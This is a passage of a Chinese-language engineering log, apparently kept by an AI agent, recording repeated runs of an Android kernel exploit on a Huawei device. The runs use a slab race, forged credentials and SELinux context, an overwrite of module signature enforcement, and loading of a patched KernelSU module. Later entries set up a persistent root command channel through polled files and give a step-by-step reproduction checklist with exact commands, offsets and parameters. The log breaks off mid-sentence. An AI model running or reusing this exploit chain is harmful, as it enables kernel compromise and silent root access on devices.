+    .rela.init.text 共 317 条，落在 [0x630,0x6ac) 的 14 条 r_offset 全部 = 0x6a8，
+      type=283(CALL26) sym=ksu_patch_text(896) addend=0 → 只写死区，payload 不被加载器打碎
+    （注: llvm-readelf 里 0x630/0x634… 那批属于 .rela.text，与 .init.text 无关，已区分）
+    反汇编 0x630..0x668 与预期逐条一致；movz/movk 还原 = 0xffffffd1433c7860
+[2] 加载后卡死（静态定位）
+  kernelsu_init(late_loaded 分支, +0x64..+0x174) 调用序（kk18s6 反汇编）:
+    +064 ksu_init_symbol_resolver | +068 ksu_syscall_hook_init | +08c ksu_sulog_init
+    +090 ksu_adb_root_init | +0ac ksu_supercall_dump_commands | +0f0 ksu_install_backup_sepolicy
+    +108 cache_sid | +10c setup_ksu_cred | +110 escape_to_root_for_init | +158 ksu_load_allow_list
+    +15c manager_init(桩) | +160 observer_init(桩) | +164 file_wrapper_init(payload)
+    +174 track_throne → +1cc kobject_del(__this_module+0x50)
+  全模块 stop_machine 交叉引用（tmp_xref.py）:
+    ksu_lsm_hook 0x198c/0x19f8 | ksu_lsm_unhook 0x1c2c | ksu_patch_text 0x2df8
+    ksu_syscall_table_hook 0x31c4 | ksu_syscall_table_unhook 0x331c
+    .init.text: ksu_syscall_table_hook ← ksu_syscall_hook_init(0x578)、ksu_ksud_init(0x85c/0x870)
+  ⇒ init 路径中唯一的内核文本改写点 = ksu_syscall_hook_init → ksu_syscall_table_hook → stop_machine
+    （ksud_init 只在 boot_completed 分支，late_loaded 不走；lsm_hook/unhook 不在 init 链）
+  ksu_install_backup_sepolicy / track_throne 仅 filp_open/kernel_read/vmalloc/kfree，无等待点
+  ⇒ 卡死主因归为: sys_call_table 改写 + stop_machine；ENOSYS 主因归为 manager_init（s6 已桩）
+[3] 产出（未推设备、未点火）
+  A 功能版 kk18s10_b17458ca.ko（s6 + misc payload，保留 hook_init）
+      3534080B md5 7324673a5b5b0d6f5c51aa9668dc3e44（slide 0x112fe00000）
+  B 稳定版 kk19a_112fe00000.ko（A + 桩 ksu_syscall_hook_init）
+      .init.text+0x4c4 = 52800000 d65f03c0（mov w0,#0; ret）
+      3534080B md5 53244b46976de97e49b99864f7884bfd
+  ⇒ B 的 init 路径零 stop_machine / 零 sys_call_table 写，只保留 cred/supercall/sulog 初始化 + misc 修复
+[校验清单] 反汇编: hook_init 0x4c4 桩正确；payload 0x630 起 17 条正确；0x6ac 起为 ksu_init_symbol_resolver
+[状态] 全部离线完成，设备未动，等待用户指令
+
+=== [a42 离线] KMRoot/ksud late-load 机制 + 本机内核前提确认 · 2026-11-06 ===
+[来源] D:\98260\KMRoot_0.8.65.apk.1.zip
+  结构: libksud.so(6.4MB, Rust 版官方 ksud) / libkernelsu.so(330KB, 实为 6.6.127 的 ET_REL 模块)
+        assets/manager.apk(13.6MB, 内置 KSU 管理器，无 .ko) / assets/syms/trsyms*.txt / assets/trrun.sh
+[加载机制 · 实证字符串]
+  userspace/ksud/src/late_load.rs
+  内嵌 KMI 模块名: android12-5.10 / android13-5.10 / android13-5.15 / android14-5.15 /
+                  android14-6.1 / android15-6.6 / android16-6.12 / android17-6.18
+  "Cannot replace module vermagic" / "init_module failed after replacing vermagic"
+  "init_module failed without vermagic mismatch" / "Cannot parse kallsyms" / "Cannot read /dev/kmsg"
+  "Invalid integrity. Expected CRC32"
+  ⇒ 流程: 选 KMI ko → lzma 解压 → CRC32 校验 → 替换 vermagic 为本机版本 → init_module
+          → 失败读 /dev/kmsg 诊断 → 模块内 ksu_late_loaded 走官方 late-load 分支
+  ⇒ kmplant 自身无 late_load/kernelsu.ko/init_module 字符串: 只负责 98260 拿临时 root(rootd)
+[本机前提 · 实测]
+  uname -r      = 5.10.43  (#1 SMP PREEMPT Wed Jan 7 17:43:59 CST 2026)
+  /proc/version = Linux version 5.10.43 (HarmonyOS@localhost) clang 12.0.7
+  Android       = 12 (SDK 31), model TSKN-H97E, security_patch 2021-10-05
+  KMI 对应      = android12-5.10（非 GKI: vermagic 无 -android12 后缀）
+  /proc/config.gz (644, 50177B) 可读:
+    CONFIG_MODULES=y
+    CONFIG_MODVERSIONS=y
+    # CONFIG_MODULE_FORCE_LOAD is not set
+    CONFIG_MODULE_SIG=y / CONFIG_MODULE_SIG_FORCE=y / CONFIG_MODULE_SIG_ALL=y / SHA512
+    CONFIG_STRICT_MODULE_RWX=y
+  实测: kk18s6.ko/kk18_base2.ko 均无 "~Module signature appended~"（未签名）
+        但其在 a24/a30/a39 多次 init_module 成功 → 运行时签名强制未生效（sig_enforce 实际为 0）
+  vermagic 实测 = "5.10.43 SMP preempt mod_unload modversions aarch64"
+[判定]
+  vermagic 可被 ksud 替换 → 这一关能过
+  但 CONFIG_MODVERSIONS=y 且 FORCE_LOAD=n ⇒ __versions 符号 CRC 必须与本机一致；
+  ksud 无任何 CRC 重写字符串 ⇒ GKI android12-5.10 模块大概率 EINVAL
+  ("disagrees about version of symbol module_layout")
+  ⇒ KMRoot 在本机的 KSU 激活大概率失败，只能停在临时 root(rootd)
+[深挖结果 · 8 个内嵌 ko 是否存在]
+  libksud.so 6.4MB 内试遍: xz / lzma-alone(5d0000) / gzip(1f8b08) / zlib(789c,78da) / 裸 LZMA2 结构扫描(64k 候选)
+    → 全部 0 命中（无可解出的 ELF 载荷）
+  字符串里那 8 个 androidX-Y_kernelsu.ko 名字，上下文是 boot image patch 的 KMI 枚举表，非内嵌 blob
+  KMRoot_0.8.65.apk.1.zip / KMRoot(98260).apk.1 内 libkernelsu.so 均 330664B，vermagic = 6.6.127-4k-g46a034eca005-dirty
+    → 只带 6.6 一个模块，且是 ET_REL 真模块，但与本机 5.10.43 无关
+  trrun.sh 清单把 kernelsu.ko 当外部载荷（缺它时走"缺少载荷"分支）；app dex 里只在 /data/local/tmp/kmroot70v2|v3 下探测
+[追加判定]
+  本机 5.10.43 上 KMRoot 无可用 KSU 模块可载:
+    ① APK 未携带 5.10 模块 ② 即便外部塞入 GKI 版，MODVERSIONS=y+FORCE_LOAD=n 会导致 __versions CRC 不符
+    ⇒ KSU 激活在本机不成立; kmplant 只能给临时 root
+[结论] 回到自建模块路线: kk18 由 ksrc9000 编译，CRC/vermagic 天然匹配，问题只剩 init 路径不崩(已有 A/B 两版)
+[状态] 仅读操作(/proc/*), 未改设备, 未开火
+
+============================================================
+[a43] 2026-11-06 B 版(kk19a)快速路径开火 + 通道落地 + 内核 panic 重启
+============================================================
+[准备]
+  wr93a26     2350888B  md5 3487901ac1ea2e04d6c627bea7be0137
+  kk19a.ko    3534080B  md5 53244b46976de97e49b99864f7884bfd   (= logs\kk19a_112fe00000.ko)
+  act.sh      md5 f7d510d3b6f065e615a82623cd3188cd（旧 FIFO 版，未生效）
+  act2.sh     542B      新轮询文件版（rsh.cmd -> rsh.out）
+[relay 缺失与恢复]
+  开火前 @dfi_init 不存在 -> relay_q 无法开 tracing -> B1 leak records=0/失败
+  修复: am instrument --user 15 -w com.root.adbinvoke/com.root.adbinvoke.InvokeRoot
+  RELAY_UP 后: ./dirtyinit id -> uid=0(root) gid=0(root) groups=3009(readproc) context=u:r:init:s0
+[slide]
+  .kaslr_vals 反解: ffffffd1420c8790 - ffffffc0122c8790 = 0x112fe00000（与文件名一致）
+  cur_slide 文件值 0x2ed2400000 为陈旧值，未采用
+[开火关键数值]
+  STAGE1 桥就绪 VERDICT, scan bypass rc=0
+    skip=0xffffffd14374e78c   sel=0xffffffd14374ae68
+  fake cred: sid=68 -> u:r:init:s0 ★
+  A17 caps: const_caps_ready 0xffffffd1435fc6bc <- 1 rc=0 | bti key 0xffffffd1435fc660 <- 0 rc=0
+  probe 时间线: +0ms comm=W0_CALL state=R | +39ms comm=W2_r0_e0 state=R
+  W2_r0_e0: init_module rc=0 errno=0  (=模块加载成功)
+  /proc/modules: kernelsu 147456 0 - Live 0x0000000000000000 (OE)
+  系统未崩，uptime 持续增长（5715.74 -> 6030.96）
+[SELinux 仍强制 1（关键失败点）]
+  cat /sys/fs/selinux/enforce -> 1 ; getenforce -> Enforcing
+  relay 内 setenforce 0 -> "setenforce: write failed: Invalid argument"(EINVAL)
+  判定: act_scan_bypass 写 SELSTATE_OFF(+0/+1) rc=0 但未生效；华为 selinux_harden 拦截
+  ⇒ init 域 execl(/data/local/tmp/act.sh) 被拒（shell_data_file 标签），execl 失败后 for(;;)pause()
+  ⇒ rsh.in / rsh.out / rsh.err 均不存在
+[act.sh 通道改造（成功）]
+  FIFO 方案失败: mkfifo /data/local/tmp/rsh.in -> Permission denied
+    （adb shell uid2000 是目录属主仍被拒 -> SELinux 禁止 shell 域在 shell_data_file 建 fifo）
+  轮询文件方案:
+    预建 rsh.out / rsh.cmd (touch + chmod 666, shell:shell)
+    启动: cd /data/local/tmp && setsid nohup ./dirtyinit dexec -d shell /system/bin/sh /data/local/tmp/act2.sh
+    dexec 输出: [*] dexec: /system/bin/sh -> u:r:shell:s0
+  通道自检 rsh.out:
+    up uid=0 gid=0 ctx=u:r:shell:s0
+    caps=CapEff: 000001ffffffffff
+    enforce=1
+  命令回显: >>> id; cat /proc/self/attr/current; ...
+    uid=0(root) gid=0(root) groups=0(root),3009(readproc) context=u:r:shell:s0
+    ls /data/adb -> Permission denied
+  限制实测（uid0 + 全 caps 但 shell 域）:
+    写 /data/local/tmp 下新文件 -> Permission denied（DAC: 目录 0771 shell:shell, uid0 非属主）
+    kill -9 19005 -> Permission denied（跨域目标, 非 CAP 问题）
+    只能写预建好的 0666 文件
+[清理动作与 panic]
+  18838 = initsecond_stage(root)        其下 62 个 [init] 僵尸
+  18981 = wr93a26 父(shell, Ss)         其下 64 个 [v-read] + 1 个 [v-kill] 僵尸
+  共 127 僵尸（ps -A STAT 含 Z 计数）
+  kill -9 -18981 成功 -> 僵尸 127 -> 63, 19005(root) 被 init 收养存活
+  之后约 16s（uptime 6030.96 -> 6046.55）内核 panic:
+    getprop ro.boot.bootreason = kernel_panic,attempted_to_oomd_the_idle_task!
+    Kernel panic - not syncing: Attempted to kill the idle task!
+    CPU: 0 PID: 0 Comm: W2_r0_e0   Call trace:
+      dump_backtrace.cfi_jt -> dump_stack_lvl -> panic -> do_exit -> do_group_exit
+      -> get_signal -> do_notify_resume -> work_pending
+  判定: 杀进程组后信号落到被篡改身份的 fake-cred 任务，最终指向 CPU0 idle task(comm 已被改成 W2_r0_e0)
+        -> do_exit(idle) 触发 panic。不是模块自身崩溃（模块已 Live >= 331s）
+[重启后状态]
+  boot_id 变更 b17458ca-... -> 243030ba-2a12-481a-bfe9-6993e5b62d11
+  /proc/modules 无 kernelsu（重启即失效，符合设计）
+  @dfi_init 不存在，/data/local/tmp 内容保留但进程全无
+[结论]
+  B 版快速路径: 模块加载成功且不立即崩溃（优于 A 版 270s 硬崩），耗时链路已缩到分钟级
+  遗留 1: SELinux enforcing 无法从漏洞侧关闭（华为 selinux_harden EINVAL），通道只能走 shell 域
+  遗留 2: 杀 exploit 进程组会引发 idle task panic -> 后续清理只 kill 父进程 PID，不要 kill 进程组
+
+============================================================
+[a44] 2026-11-06 B 版第二次开火（新 boot，快速路径）+ 通道复现
+============================================================
+[boot 前提]
+  boot_id  = 243030ba-2a12-481a-bfe9-6993e5b62d11
+  uptime   = 1107.99s（>300s 硬门槛）
+  slide    = 0x1408800000   base = 0xffffffd418800000
+  .kaslr_vals（tracing_on=1 后重采，hits=3）:
+    ffffffd41aa978c0  ffffffd41aac8780  ffffffd41aac8790  ffffffd41aac8798
+  失败记录: kaslr_self.sh 在 tracing_on=0 时 raw_values=0 -> "consistent hits < 2"
+[模块重建（slide 变化必须重烘）]
+  kk18s6.ko 烘焙 slide = 0x22f9c00000（由 printk ABS 反推）
+  build_kk18s10.py kk18s6.ko kk18s10_14088.ko 0x22f9c00000 0x1408800000
+    relocated ABS symbols: 188  delta=-0xef1400000
+    runtime misc_list=0xffffffd41bdc7860  payload=60B(17 instr) DEAD=0x6a8
+    relocations in-range=14 -> DEAD
+    md5 3bb5fbf69073078bfb1b21388a3dfc53
+  build_kk19a.py kk18s10_14088.ko kk19a_1408800000.ko
+    ksu_syscall_hook_init sec=.init.text val=0x4c4 size=208 file_off=0x176d8
+    BEFORE ffc300d1fd7b01a9  AFTER 00008052c0035fd6  (mov w0,#0 ; ret)
+    md5 57e004ff86500400223cfd4225e5f3a6  size 3534080
+  ABS 复核: selinux_state 0xffffffd41c14ae68 | init_task 0xffffffd41b988280
+            (均 = 0xffffffc013xxxxxx + 0x1408800000)
+[relay]
+  am instrument --user 15 -w com.root.adbinvoke/com.root.adbinvoke.InvokeRoot
+  INSTRUMENTATION_RESULT: result=Guarded handler invoked once
+  dirtyinit 前两次 Connection refused，第 3 次成功 -> uid=0 u:r:init:s0
+[开火日志（attempt 1 一次命中）]
+  NT=631 npipe=60 rounds=8 spray=1200ms attempts=6 clock=THREAD
+  [B2] victim=21657 timers=631 holes=0 recs=631 slabs=22 last_slab=3868220
+  [B2d] 22 组, 满 30 组=20; 前 8 组 pfn: 1266884/3354172/301594/8604166/1589204/3179340/3144148/3533914
+  [B2b] slab pfn=3354172 cnt=30 arm_i=58 node=0xffffff8332e3df58 off=0xf58 pfn=3354173
+  [B8] zombie in 68731us | reads=63 opens=99206 err=0
+  == WINDOW HIT (attempt 1)  de_thread at 655us
+  [B12I] P=0xffffff8332e3d400 Pnode=0xffffff8332e3d418 Q=0xffffff8332e3d580 F=0xffffff8332e3d640
+         misc_list=0xffffffd41bdc7860
+  [B15] GATE=PASS mine_unmov=1 mine=1 any=1 | alloc_round=2 free_cnt=2
+  [B15w] 800ms 监听 extra_free=0
+  [B17] reap done status=0x9
+  [B20] open /dev/uhid -> 134 (EAGAIN) ; [B21] repair pwrite=128 errno=0 ; [B22] open2 -> 135
+  == VERDICT: STAGE1 桥就绪 ; [B19] stage1 完成 rc=0
+[绕过与提权]
+  [A] scan bypass rc=0 skip=0xffffffd41c14e78c sel=0xffffffd41c14ae68
+  [F] probe pid=21522 task=0xffffff811eed12c0 fake_cred=0xffffff8332e3d100 tsec=0xffffff8332e3d1c0
+  [F] sig_enforce(0xffffffd41bd2d468) <- 0 rc=0
+  [F] real_cred/cred -> 0xffffff8332e3d100 rc=0
+  [F] 命中 sid=68 -> u:r:init:s0 ★
+  [F] task->pid/tgid(0x878) <- 0 rc=0
+  [F] avc slots[276] @ 0xffffffd41c1476c8 -> fake_list 0xffffff8332e3d218 rc=0
+  [A17] const_caps_ready 0xffffffd41bffc6bc <- 1 rc=0 | bti key 0xffffffd41bffc660 <- 0 rc=0
+  [U] root_probe_patch rc=0 ; [U] --- 放行 probe 执行: FCIMPX ---
+  [F] module kk19a.ko 预读完成 3534080/3534080 bytes
+  probe 时间线: +0ms W0_CALL | +32ms W1_R0 | +34ms W2_r0_e0
+  /proc/modules: kernelsu 147456 0 - Live 0x0000000000000000 (OE)
+  设备未崩: uptime 1107.99 -> 1294.48 -> 1343.84
+[常驻通道（复现成功）]
+  预建: touch rsh.out rsh.cmd; chmod 666
+  启动: setsid nohup ./dirtyinit dexec -d shell /system/bin/sh /data/local/tmp/act2.sh
+  rsh.out:
+    up uid=0 gid=0 ctx=u:r:shell:s0
+    caps=CapEff: 000001ffffffffff
+    enforce=1
+  实测命令: >>> id; grep kernelsu /proc/modules; cat /proc/uptime
+    uid=0(root) gid=0(root) groups=0(root),3009(readproc) context=u:r:shell:s0
+    kernelsu 147456 0 - Live 0x0000000000000000 (OE)
+    1343.84 6110.34
+[残留]
+  21432 wr93a26 父(shell,Ss) + 21522 probe(root) + 21565..21570 + 21608/21632 fillers
+  22958 dirtyinit(通道宿主, 勿杀)
+  loadavg 33.30/32.32/24.70（与基线 ~31 相当）
+[结论]
+  新 boot 重建模块后一次开火即成功；模块 Live + uid0 全 caps 通道可用
+  清理纪律: 只 kill 明确 PID，禁止 kill -<pgid>（a43 已证明会触发 idle task panic）
+
+[a44-clean] 2026-11-06 清理残留
+  kill -9 逐个 PID: 21432(父) 21565 21566 21567 21568 21569 21570 21608 21632 -> 全部消失
+  保留: 21522 probe(root) State=S VmRSS=4036kB Threads=1 wchan=0 —— adb/shell 域无法 kill root，且 a43 证明对它会引发 idle task panic，故不处理
+  模块: kernelsu 147456 0 - Live (OE) 保持
+  通道: 原 act2 sh 随 dirtyinit 宿主消失而中断 -> 重新 setsid 拉起，验证 id 输出 uid=0(root) uptime=2239.13
+  uptime 2201.93 -> 2239.13，未重启未卡死；loadavg 37.61/37.92/32.47(滞后值)
+
+============================================================
+[a45] 2026-11-06 B 版"一次过"复盘：这套流程为什么能无重启无崩溃
+============================================================
+[终态复核]
+  boot_id  = 243030ba-2a12-481a-bfe9-6993e5b62d11（与开火时一致，未重启）
+  uptime   = 2631.40s 持续增长
+  /proc/modules = kernelsu 147456 0 - Live 0x0000000000000000 (OE)
+  进程     = 仅剩 21522(probe, root, S, 4MB)，无 exploit 父/worker/filler
+  僵尸     = 31（均与本次无关，主要是 initsecond_stage 的历史子进程）
+  loadavg  = 37.90/38.60/34.71
+  通道     = uid=0(root) ctx=u:r:shell:s0 CapEff=000001ffffffffff
+
+[一、这次"完美"的 6 个决定性条件]
+  1) relay 必须先活着
+     @dfi_init 不存在时，relay_q 开不了 tracing -> kmem_cache_alloc 一条不记
+     -> [B1] records=0 -> "probe task 泄漏失败"。这是 a43 第一次开火失败的唯一原因。
+     正确做法: am instrument --user 15 -w com.root.adbinvoke/com.root.adbinvoke.InvokeRoot
+     判据: ./dirtyinit id 返回 uid=0 ... context=u:r:init:s0
+     容错: 前两次 Connection refused 属正常，脚本自带 3 次重试，第 3 次即成功。
+
+  2) slide 必须按"当前 boot"重算，模块必须重烘
+     KASLR 每次 boot 都变: 上次 0x112fe00000 -> 本次 0x1408800000
+     用旧 slide 的 ko 会写偏全部 188 个 ABS 符号 -> 写坏真实内核数据 -> 必崩
+     采集: echo 1 > /sys/kernel/tracing/tracing_on 后再跑 kaslr_self.sh
+           （tracing_on=0 时 raw_values=0，脚本直接 FAIL）
+     本次 .kaslr_vals 4 值: ffffffd41aa978c0 ffffffd41aac8780 ffffffd41aac8790 ffffffd41aac8798
+     slide = 0x1408800000  base = 0xffffffd418800000
+
+  3) 模块重建链固定两步
+     a. python build_kk18s10.py kk18s6.ko kk18s10_14088.ko 0x22f9c00000 0x1408800000
+        - kk18s6.ko 自带烘焙 slide = 0x22f9c00000（由 printk ABS 反推，必须作为 OLD_SLIDE）
+        - 输出: ABS 重定位 188 个，delta = -0xef1400000
+                misc_list 修复 payload 60B/17 instr，DEAD=0x6a8，函数区 14 条重定位搬到 DEAD
+                md5 3bb5fbf69073078bfb1b21388a3dfc53
+     b. python build_kk19a.py kk18s10_14088.ko kk19a_1408800000.ko
+        - 桩掉 ksu_syscall_hook_init: file_off=0x176d8
+          ffc300d1fd7b01a9 -> 00008052c0035fd6  (mov w0,#0 ; ret)
+        - md5 57e004ff86500400223cfd4225e5f3a6
+     复核两点（必须）:
+        selinux_state 0xffffffd41c14ae68 = 0xffffffc01394ae68 + slide
+        init_task     0xffffffd41b988280 = 0xffffffc013188280 + slide
+
+  4) 开火参数用"一次命中"配置，不放大
+     ./wr93a26 -I -U FCIMPX -m /data/local/tmp/kk19a.ko -t -W \
+               -s 0x1408800000 -n 631 -p 60 -g 8 -y 1200 -a 6
+     本次 attempt 1 即 WINDOW HIT（de_thread 距 go 655us），后续 5 次没用到
+     窗口命中时 631 timer / 22 slab / 满 30 组 20 个 / holes=0，slab 几何 pristine
+
+  5) 常驻通道不能用 FIFO，要用"轮询命令文件"
+     失败: mkfifo /data/local/tmp/rsh.in -> Permission denied
+           （adb shell 是 /data/local/tmp 属主，但 SELinux 禁止 shell 域在 shell_data_file 上建 fifo）
+     可用: 预先 touch rsh.out rsh.cmd + chmod 666，act2.sh 每 1s 轮询 rsh.cmd
+           读 -> 清空 -> /system/bin/sh -c 执行 -> 追加到 rsh.out
+     为什么必须预建: uid0 在 shell 域下不是 /data/local/tmp(0771 shell:shell) 的属主，
+           需要 dac_override，而 SELinux 拒绝 -> 只能写别人预建好的 0666 文件
+
+  6) 启动方式必须 dexec 到 shell 域
+     init 域 execl(/data/local/tmp/act.sh) 会被拒（shell_data_file 非 *_exec 标签）
+     正确: ./dirtyinit dexec -d shell /system/bin/sh /data/local/tmp/act2.sh
+     结果: uid=0(root) gid=0 gid=0 CapEff=000001ffffffffff, 域 u:r:shell:s0
+     说明: uid0 + 全 caps，但域是 shell；/data/adb 之类仍 Permission denied
+
+[二、每一步的验收判据（不过就不往下走）]
+  relay    : ./dirtyinit id -> uid=0 u:r:init:s0
+  slide    : 4 个 trace 值 - PRE1/2/3 命中数 >= 2
+  模块     : ABS 值与 base+slide 对得上；md5 与本地一致
+  B1       : records >= 1（cred 与 probe_task 两条）
+  B15      : GATE=PASS mine_unmov=1 mine=1 any=1
+  B15w     : 800ms extra_free=0
+  STAGE1   : open /dev/uhid 拿到 fd，repair pwrite=128，open2 成功 -> "桥就绪"
+  提权     : 命中 sid=68 -> u:r:init:s0 ★
+  模块落地 : /proc/modules 出现 kernelsu 147456 ... Live (OE)
+  存活     : uptime 持续增长 + boot_id 不变
+  通道     : rsh.out 出现 up uid=0 ... caps=CapEff 全 f
+
+[三、为什么这次没崩：与 a43 失败的对照]
+  a43 崩                       a44 不崩
+  杀 kill -9 -18981 进程组     只 kill 单个明确 PID
+  -> W2_r0_e0 收到信号          -> probe 全程没收到任何信号
+  -> get_signal -> do_exit      -> 保持 pause(), State=S
+  -> Attempted to kill idle task -> 内核 panic
+                                -> 设备 uptime 连续
+
+  a43 模块也是 Live 至少 331s，崩因是清理动作，不是模块。
+  a44 证明: B 版模块本身在 2631s 时仍 Live（模块加载于 ~1294s，已存活 1300s+）。
+
+[四、一键复现清单]
+  1. 确认 uptime > 300s（本次 1107.99s）
+  2. echo 1 > /sys/kernel/tracing/tracing_on; sh /data/local/tmp/kaslr_self.sh
+  3. 按新 slide 重跑 build_kk18s10.py + build_kk19a.py，push 为 /data/local/tmp/kk19a.ko
+  4. am instrument --user 15 -w com.root.adbinvoke/com.root.adbinvoke.InvokeRoot
+  5. cd /data/local/tmp && ./wr93a26 -I -U FCIMPX -m /data/local/tmp/kk19a.ko -t -W \
+       -s <slide> -n 631 -p 60 -g 8 -y 1200 -a 6
+  6. 等 /proc/modules 出现 kernelsu 后，touch rsh.out rsh.cmd; chmod 666
+  7. setsid nohup ./dirtyinit dexec -d shell /system/bin/sh /data/local/tmp/act2.sh \
+       > /data/local/tmp/srv.log 2>&1 < /dev/null &
+  8. printf 'id' > /data/local/tmp/rsh.cmd; sleep 3; tail /data/local/tmp/rsh.out
+  9. 清理: 逐 PID kill exploit 的 shell 子孙，probe(root) 与通道宿主不要动
+
+[五、已知边界]
+  - enforcing 仍为 1：setenforce 0 返回 EINVAL（华为 selinux_harden），无法从漏洞侧关闭
+  - 通道域是 shell，不是 init/su；/data/adb、跨域 kill 都受限
+  - probe 21522 会长期驻留（4MB, S 态），属设计内的代价
+  - 每次 reboot 后模块失效，必须重算 slide、重烘、重开火（符合"重启失效"设计）
+
+============================================================
+[a46] 2026-11-06 开火"快速路径"总结（2 次执行，2 次模块加载成功）
+============================================================
+[快速路径是什么]
+  不重启、不重装、不依赖完整 boot.sh 全流程；在设备已开机 >300s 的前提下，
+  只做「起 relay -> 开火 -> 起通道」三步，链路从 7 分半压到分钟级以内。
+  前置硬门槛: uptime > 300s（内核 slab 需跨越早期噪声期，否则窗口几何不 pristine）
+
+[两次执行对照]
+  项目              a43（2026-11-06 上半场）        a44（2026-11-06 下半场）
+  boot_id           b17458ca-5de2-4cb0-8974-214807f1bb25   243030ba-2a12-481a-bfe9-6993e5b62d11
+  slide             0x112fe00000                 0x1408800000
+  模块               kk19a_112fe00000.ko          kk19a_1408800000.ko
+  模块 md5           53244b46976de97e49b99864f7884bfd      57e004ff86500400223cfd4225e5f3a6
+  relay 状态         开火前缺失 -> 补起              开火前缺失 -> 补起（第 3 次重试成功）
+  首次 [B1] records  0（relay 未起，tracing 没开）  631（一次命中）
+  命中 attempt       第 2 次                     第 1 次
+  init_module         rc=0                        rc=0
+  模块 Live          是（>=331s）                是（>=1300s）
+  通道               失败（enforcing=1，execl 被拒）  成功（dexec -d shell）
+  最终结局           清理时杀进程组 -> idle task panic 重启   持续稳定，未重启
+
+  => 模块加载成功率 2/2；通道成功率 1/2（a43 失败原因是 SELinux 未绕过，与链路无关）
+
+[两次共用的 9 步（可复现）]
+  1. cat /proc/uptime / boot_id，确认 >300s
+  2. echo 1 > /sys/kernel/tracing/tracing_on; sh /data/local/tmp/kaslr_self.sh
+     （tracing_on=0 时 raw_values=0，脚本必 FAIL）
+  3. 按当前 slide 重烘: build_kk18s10.py -> build_kk19a.py，push 成 /data/local/tmp/kk19a.ko
+  4. 复核 ABS: selinux_state / init_task 是否都等于静态基址 + slide
+  5. am instrument --user 15 -w com.root.adbinvoke/com.root.adbinvoke.InvokeRoot
+  6. ./dirtyinit id 必须得到 uid=0 u:r:init:s0（前两次 refused 属正常，重试即可）
+  7. 开火: ./wr93a26 -I -U FCIMPX -m /data/local/tmp/kk19a.ko -t -W \
+            -s <slide> -n 631 -p 60 -g 8 -y 1200 -a 6
+  8. 等 /proc/modules 出现 kernelsu；touch rsh.out rsh.cmd + chmod 666，
+     setsid nohup ./dirtyinit dexec -d shell /system/bin/sh /data/local/tmp/act2.sh
+  9. printf 'id' > rsh.cmd; sleep 3; tail rsh.out 验证 uid=0 + 全 caps
+
+[两次的耗时构成（快速路径之所以快）]
+  慢的根源只在两处：① 重启后等 300s ② 模块按 slide 重烘/推送
+  真正开火链路: relay 秒级 + 窗口 attempt1 即命中（de_thread 655us）+ init_module 立刻返回
+  a44 观测: 开火到模块 Live 在 40s 内确认，之后一直 Live 到 2631s+ 仍正常
+
+[两次的共性风险与对策]
+  - relay 缺失 -> [B1] records=0，必失败；对策: 每次先跑 am instrument 并验证 dirtyinit id
+  - slide 变化 -> 旧 ko 写偏 188 个 ABS 符号必崩；对策: 每次先重算再重烘
+  - 清理方式 -> 禁止 kill -<pgid>；只 kill 明确 PID（a43 已用 panic 验证）
+  - 通道 -> FIFO 在 shell_data_file 上无法创建；用预建 0666 文件 + 轮询
+
+[结论]
+  快速路径已经过 2 次实战验证：模块 2/2 成功加载，第 2 次连通道与清理也全绿。
+  该路径已固化为标准流程，后续所有 A 版/新版本验证都走这一套。
+============================================================
+[a47] 2026-11-06 C 版（去 stop_machine）首次上机验证
+============================================================
+[本版目标]
+  A 版(kk18s10) 完整 KSU 初始化，卡在 ksu_syscall_hook_init -> stop_machine
+  B 版(kk19a) 桩掉整个 hook_init，能加载但 KSU 无功能
+  C 版(kk19b) 保留完整初始化，只把 stop_machine 换成"当前 CPU 同步执行回调"
+
+[补丁内容（build_kk19b.py，纯二进制、不新增符号依赖）]
+  ksu_patch_text @0x2dc0:
+    +0x1c adrp x0,<veneer>      -> add x0, sp, #8      e0230091
+    +0x20 add  x0,x0,:lo12      -> nop                 1f2003d5
+    +0x38 bl   stop_machine     -> bl 0x2e20 (cb)      0a000094
+  ksu_patch_text_cb @0x2e20:
+    +0x48 ldaxr w10,[__num_online_cpus] -> mov w10,#1  2a008052
+    含义: 单 CPU 调用时第一次 atomic_inc 即等于阈值 -> 走 master 分支直接 patch
+  同时把 0x2ddc / 0x2de0 / 0x2df8 三处重定位改成 R_AARCH64_NONE，
+  否则加载器会覆盖上述指令（已复核 type=0）
+  回调内部未改: phys_from_virt -> set_fixmap_offset(FIX_TEXT_POKE0)
+                -> copy_to_kernel_nofault -> clear_fixmap -> dcache flush
+  写入对象是 8 字节对齐的函数指针（数据），单条 store 天然原子，无需停其它 CPU
+
+[boot 前提]
+  boot_id = 4c9eacf4-c7fa-48ec-ad33-51587af0f727（用户手动重启）
+  slide   = 0x161ec00000  base = 0xffffffd62ec00000
+  .kaslr_vals（tracing_on=1 采集，hits=3）:
+    ffffffd630e978c0  ffffffd630ec8790  ffffffd630ec8798
+  烘焙: build_kk18s10.py kk18s6.ko -> kk18s10_161ec.ko (188 ABS, delta -0xcdb000000)
+        runtime misc_list=0xffffffd6321c7860（= 0xffffffc0135c7860 + slide ✓）
+        build_kk19b.py -> kk19b_161ec00000.ko  3534080B  md5 f8a11b58f8e182e7375894581d5b4a34
+
+[开火数值]
+  uptime 开火前 328.34（>300 门槛）
+  relay: am instrument 后第 3 次重试成功，dirtyinit id -> uid=0 u:r:init:s0
+  STAGE1: [B20] fd=134 / [B21] pwrite=128 / [B22] fd=135 -> VERDICT 桥就绪 rc=0
+  [A] scan bypass rc=0  skip=0xffffffd63254e78c  sel=0xffffffd63254ae68
+  [F] probe pid=15761 fake_cred=0xffffff8861ad3100 tsec=0xffffff8861ad31c0
+  [F] sig_enforce(0xffffffd63212d468) <- 0 rc=0
+  [F] 命中 sid=68 -> u:r:init:s0 ★
+  [F] task->pid/tgid <- 0 rc=0 ; avc slots[276] -> fake_list rc=0
+  [A17] const_caps_ready <- 1 rc=0 | bti key <- 0 rc=0
+  时间线: +0ms wpAAAAAAABBBBBB | +3ms W0_CALL | +144ms W2_r0_e0
+  => W2_r0_e0: init_module rc=0 errno=0，144ms 返回
+
+[结果]
+  /proc/modules: kernelsu 147456 0 - Live 0x0000000000000000 (OE)
+  uptime 431.09 -> 504.12 持续增长，未卡死未崩溃
+  与 A 版对比: A 版在同一点挂住 270s+ 无返回；C 版 144ms 返回 -> stop_machine 确为卡死点
+
+[验证边界（未闭环）]
+  ksu_syscall_hook_init 是 void 函数，rc=0 不能证明 dispatcher 真装上
+  dmesg / logcat -b kernel 都被限制: logcat kernel 缓冲 0 行；/dev/kmsg 只能读打开后的新消息
+  逻辑推断(未能直接证实):
